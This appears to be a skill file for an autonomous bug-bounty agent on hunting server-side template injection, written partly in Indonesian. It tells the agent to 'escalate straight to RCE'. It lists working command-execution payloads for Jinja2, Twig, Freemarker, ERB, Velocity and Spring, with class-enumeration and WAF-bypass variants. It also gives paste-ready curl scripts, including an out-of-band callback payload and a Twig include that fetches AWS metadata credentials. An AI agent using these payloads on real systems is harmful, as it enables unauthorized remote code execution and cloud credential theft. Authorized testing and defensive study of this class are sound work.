---
name: hunt-ssti
description: "Hunt server-side template injection (SSTI) across Jinja2 (Flask/Django), Twig (Symfony), Freemarker (Java), ERB (Rails), Spring, Velocity, Mako, Thymeleaf, Smarty. Detection probes use double-curly and dollar-curly math expressions evaluated server-side. Once an engine is fingerprinted, escalate to RCE via the engine-specific class-walker, callback-registrar, or Execute-utility patterns documented in disclosed reports. Detection patterns: error messages reveal engine, blank or numeric eval reveals expression mode. Targets: email templates, PDF/report generators, CMS preview features, error pages with user input. Use when hunting RCE via template rendering, when content shows engine fingerprints, when finding endpoints that compose strings with user input before render."
sources: hackerone_public, cve_database, public_research
report_count: 6
---
> **appsec-fyi supplement (source-cited, 2026 CVEs):** `references/appsec-fyi-techniques.md` —
> additive per-class technique list from https://appsec.fyi. Owner methodology below still wins.

## Autonomous Testing Priority

**Escalate straight to RCE — don't stop at arithmetic detection.**

Arithmetic probes (`{{7*7}}→49`) confirm the injection point but are not proof of impact. The real goal is OS command execution. Arithmetic detection also fails silently when the app echoes the input back (e.g. inside an HTML attribute like `<input value="{{7*7}}">`), producing a false negative even when injection exists.

**Order of attack:**
1. **Try Jinja2 RCE first** (covers Python/Flask — the most common stack in modern web apps):
   ```
   {{config.__class__.__init__.__globals__['os'].popen('id').read()}}
   ```
2. **If the endpoint is a traditional web form**, send as form-encoded body — NOT JSON:
   ```
   Content-Type: application/x-www-form-urlencoded
   field={{config.__class__.__init__.__globals__['os'].popen('id').read()}}
   ```
   JSON bodies are silently ignored by form-processing endpoints (`request.form['field']` sees nothing).
3. **If Jinja2 fails**, try Twig (PHP/Symfony): `{{_self.env.registerUndefinedFilterCallback("exec")}}{{_self.env.getFilter("id")}}`
4. **Fall back to arithmetic detection** only to fingerprint the engine when RCE payloads fail.

**Proof:** Command output (`uid=N(user) gid=...`) in the response confirms RCE. If the output appears in HTML (inside a `<div>` or `<pre>`), that still counts — the format is irrelevant, the content is the evidence.

---

## 14. SSTI — SERVER-SIDE TEMPLATE INJECTION

> **SANDBOX-ESCAPE MATRIX:** `references/ssti-sandbox-escape-matrix.md` — the full per-engine
> escape payloads (Jinja2 class-walker family incl. no-`config`/length-constrained variants,
> Twig `_self.env`, Freemarker `Execute`/`ObjectConstructor`, Velocity classloader, ERB, SpEL/
> Thymeleaf `T()` walks, Smarty, Mako), blind OOB confirmation, and the sandbox-vs-RCE-vs-CSTI
> disambiguation table. Read it when `{{7*7}}→49` confirms evaluation so you pick the right escape.
> Easy to detect, high payout ($2K–$8K). Direct path to RCE.

### Detection Payloads (try all)
```
{{7*7}}          → 49 = Jinja2 / Twig
${7*7}           → 49 = Freemarker / Velocity / Mako (all use ${...})
<%= 7*7 %>       → 49 = ERB (Ruby)
*{7*7}           → 49 = Spring Thymeleaf
{{7*'7'}}        → 7777777 = Jinja2 (Python string repetition); 49 = Twig (numeric coercion of '7'). Differentiates Jinja2 from Twig.
```

### RCE Payloads

**Jinja2 (Python/Flask):**
```python
{{config.__class__.__init__.__globals__['os'].popen('id').read()}}
```

**Twig (PHP/Symfony):**
```php
{{_self.env.registerUndefinedFilterCallback("exec")}}{{_self.env.getFilter("id")}}
```

**ERB (Ruby):**
```ruby
<%= `id` %>
```

### Length-constrained injection fields (profile name, display name, subject)
When the injectable field caps input length (a profile-name / display-name field is often ≤30-64 chars), the full `os.popen` one-liner won't fit — but detection and class-enumeration still do. Confirm with the short probe, then enumerate the gadget index in stages instead of one payload:
```python
{{ '7'*7 }}                                  # detection, fits anywhere
{{ [].__class__.__base__.__subclasses__() }} # dump class list, pick the index for subprocess.Popen/os
{{ ''.__class__.__mro__[1].__subclasses__()[INDEX]('id',shell=True,stdout=-1).communicate() }}
```
The reflected sink is frequently an **outbound email** (the account-update / confirmation mail rendering your name), not the web page — read the email body for the evaluated output. Disclosed: reports/125980 (profile-name → Jinja2 → confirmation email, length-limited).

### Where to Test
```
Name/bio/description fields, email templates, invoice name, PDF generators,
URL path parameters, search queries reflected in results, HTTP headers reflected
```

### CMS / "documentation" template-editor forms (authenticated)

Some SSTI lives behind a logged-in template editor (CMS "edit template" / product-template / email-template
preview). PortSwigger's *"SSTI using documentation"* class is this shape. Three things break a naive attempt:

1. **Fingerprint BEFORE firing RCE — the engine decides the syntax.** Do NOT assume Jinja2. Probe the
   whole matrix and read which one evaluates:
   ```
   ${7*7}  → 49  AND  #{7*7} → 49   ⇒ Freemarker (Java)   ← {{7*7}} does NOTHING here
   {{7*7}} → 49                      ⇒ Jinja2 / Twig
   <%= 7*7 %> → 49                   ⇒ ERB (Ruby)
   *{7*7}  → 49                      ⇒ Thymeleaf (Spring)
   ```
   If `{{7*7}}` renders literally but `${7*7}`→49, you are on **Freemarker** — stop sending `{{config...}}`.

2. **The record id is usually a QUERY param, not a body field.** The editor form posts back to
   `POST /…/template?productId=N` with the id in the URL. The BODY carries only
   `csrf`, `template`, and a `template-action` (`preview` | `save`). Putting the id in the body returns
   `400 "Missing product id"`. So keep the id in the query string (`?productId=N`) AND send a
   form-encoded body of `csrf=…&template=<PAYLOAD>&template-action=preview`.

3. **Re-fetch the CSRF each time and use `preview` to iterate.** GET the editor page to read a *fresh*
   `csrf` hidden field; `template-action=preview` renders your payload WITHOUT persisting (fast feedback
   loop). Switch to `template-action=save` only once the payload is right, then trigger the render
   (load the public page that uses the template) to fire the command.

   **Freemarker documentation RCE** (the documented `Execute` utility — this IS the intended technique):
   ```
   <#assign ex="freemarker.template.utility.Execute"?new()>${ ex("id") }
   ```
   Velocity equivalent: `#set($e="e");$e.getClass().forName("java.lang.Runtime")...`.

---

## Minimum 5 probes (wajib sebelum kelas ini boleh N/A)

| # | Probe | Kenapa ini dulu |
|---|---|---|
| 1 | Poliglot: kirim `{{7*7}}`, `${7*7}', `{{7*'7'}}`, `<%=7*7%>` | Deteksi engine |
| 2 | Fingerprint engine dari error & sintaksis yang dievaluasi | Menentukan payload |
| 3 | Sandbox escape: Jinja2 `''.__class__.__mro__`, Twig `_self` | Rantai ke RCE |
| 4 | Client vs server: `{{7*7}}` → 49 di Angular/Vue = **CSTI**, laporkan sebagai XSS | Jangan salah klasifikasi |
| 5 | Blind: gunakan waktu & OOB kalau tak ada output | Konfirmasi tanpa refleksi |

**Aturan:** kalau salah satu probe belum dijalankan, kelas ini **belum boleh** ditulis
N/A. N/A harus menyebut probe mana yang sudah dicoba dan hasilnya.

## Gate 0 Validation

1. **Apa yang bisa dilakukan penyerang SEKARANG?** "Penyerang bisa menjalankan perintah server melalui template injection di field `name`" — tunjukkan `{{7*7}}` → 49 lalu eksekusi marker.
2. **Apa yang hilang dari korban?** RCE server. Untuk CSTI client-side, laporkan sebagai XSS dan buktikan eksekusi JS.
3. **Bisa direproduksi 10 menit dari nol?** Sertakan payload dan respons. Berhenti pada marker tak berbahaya.

## Eskalasi wajib (jangan berhenti di kelas ini)

**Primitif:** eksekusi template server-side

**Teknik pengembangan:** sandbox escape -> RCE; baca file/env -> kredensial

**Eskalasi ke:** `hunt-rce` · `hunt-info-disclosure`

**Depth target:** L3 -> L5

Satu temuan di kelas ini WAJIB menyebut eskalasi berikutnya (atau alasan primitif habis).
Lihat `exploit-chain-graph` + `exploit-depth` (L0-L5). `depth_gate.py` memblokir temuan
yang buktinya cuma status code.

## Runnable probes

Commands you can paste. `<TARGET>`/`<RPC>` are placeholders — fill them
from recon, do not guess endpoints.

```bash
# 0) find reflective fields first (SSTI needs a render, not a reflection)
printf '%s\n' '<TARGET>' | katana -d 2 -silent | head -50 > urls.txt
cat urls.txt | qsreplace 'zsst1canary' | xargs -I{} -P2 curl -sS -o /dev/null -w '%{url_effective}\n' '{}'

# 1) POLYGLOT — one request tests Jinja2 / Twig / Freemarker / Velocity / Pebble
curl -sS 'https://<TARGET>/search?q={{7*7}}${7*7}%23{7*7}%3C%25%3D7*7%25%3E' -o s1.html
grep -oE '(^|[^0-9])49([^0-9]|$)' s1.html | head

# 2) engine fingerprint — the error text names the engine
curl -sS 'https://<TARGET>/search?q={{' -o s2.html; grep -oiE 'jinja2|twig|freemarker|velocity|pebble|handlebars|mustache|smarty' s2.html | sort -u

# 3) arithmetic that only an EVALUATOR can produce (not a coincidence with 49)
curl -sS 'https://<TARGET>/search?q={{7919*3}}' -o s3.html; grep -c '23757' s3.html

# 4) server-side vs CLIENT-side — the classification that decides severity
curl -sS 'https://<TARGET>/search?q={{7*7}}' | grep -qiE 'angular|vue|react' && echo 'CSTI candidate -> report as XSS'

# 5) blind SSTI — OOB callback instead of output
curl -sS --data-urlencode 'name={{cycler.__init__.__globals__.os.popen("curl zsst.<COLLAB>").read()}}' \
  https://<TARGET>/render -o /dev/null   # watch the interactsh log, not the response
```

**Kill switch:** `{{7*7}}` → `49` in a client-side framework is **CSTI = XSS**, not
server RCE. Check the deciding signal before scoring.

---

## Related Skills & Chains

- **Surface atlas** (`security/bb-audit-launcher/references/rce-surface-atlas.md`) — the 10 RCE entry points (7 web2 + 3 web3 analogues): where to look, what proves execution, severity per surface. This skill is the payload depth; the atlas is the coverage checklist.

- **`hunt-rce`** — SSTI is the easiest path to RCE on Python/Ruby/PHP/Java stacks because the template language already exposes the runtime. Chain primitive: Jinja2 `{{config.__class__.__init__.__globals__['os'].popen('id').read()}}` or Freemarker `<#assign x="freemarker.template.utility.Execute"?new()>${x("id")}` → unauthenticated RCE as the rendering worker. Always escalate fingerprint → class-walker → cmd exec.
- **`hunt-xss`** — When the template engine sandboxes the runtime (or you only get the rendered output back as HTML), the same `{{7*7}}` reflection often still yields stored XSS. Chain primitive: sandboxed Jinja2 SSTI without escapes → inject `<script>` into rendered email template → stored XSS hitting every recipient who views the message.
- **`hunt-ssrf`** — Template engines often expose URL fetchers/filters before they expose the runtime, giving you SSRF before RCE. Chain primitive: Twig `{{ include('http://169.254.169.254/latest/meta-data/iam/security-credentials/') }}` or Jinja2 with `url_for`/custom filters → AWS metadata exfil → cloud creds.
- **`hunt-file-upload`** — Office docs, SVGs, and email templates uploaded by the user are common SSTI surfaces (the server re-renders them). Chain primitive: upload a DOCX whose `word/document.xml` contains `${T(java.lang.Runtime).getRuntime().exec("id")}` to a Velocity/Freemarker-driven mail-merge → RCE.
- **`security-arsenal`** — Reach for the engine-specific escape payload tree: Jinja2 class-walker variants (`__subclasses__()[N]` index hunting), Twig `_self.env` registerUndefinedFilterCallback, Freemarker `?new()` Execute, ERB backticks, Velocity `$class.inspect`, Smarty `{php}...{/php}`, plus the WAF-bypass variants (`{{request|attr('application')|...}}`, Unicode escapes, `{%print(...)%}`).
- **`triage-validation`** — Apply the Pre-Severity Gate before claiming Critical RCE. A `{{7*7}} → 49` reflection inside a sandboxed engine (e.g., Twig sandbox mode, Jinja2 SandboxedEnvironment with no escape) is Medium SSTI, not Critical RCE. Prove `id`/OOB DNS callback with a unique marker before writing the report.


## 2026 sweep (dork pass 2026-10-18 — 1 repo)

- **CVE-2026-31857 — CraftCMS attacker-controlled object template in unsandboxed Twig → RCE** (`TRX-0/CVE-2026-31857-craftcms-ssti` ★0)
  - an attacker-controlled object template in an unsandboxed Twig context, enabling command
  - session after login and does not call an HTTP 200 proof of RCE unless expected command


## 2026 sweep 3 (dork pass 2026-10-18 — web2, 1 repo)

- CVE-2026-22692 — **critical Twig sandbox bypass** via `collect()->mapInto()` in October CMS, allowing RCE/LFI/XXE: the gadget lets an attacker instantiate **any class known to the application** (CWE-74). Lesson: a template sandbox is only as strong as its callable-surface allow-list.
  - CVE-2026-22692: Critical Twig Sandbox Bypass via collect()->mapInto() allowing RCE/LFI/XXE (October CMS)
  - CWE-74: Improper Neutralization of Special Elements in Output Used by a Downstream Component ('Injection')


## Critical severity anchor (kelas ini bisa Critical — syaratnya)

Template injection → RCE via sandbox escape (Jinja2, Twig, Freemarker, Velocity); polyglot payload untuk fingerprint engine. Kalibrasi: `${7*7}` = 49 hanya membuktikan evaluasi; Critical butuh eksekusi perintah atau baca file terbukti; engine yang sandbox dengan benar = the fix.
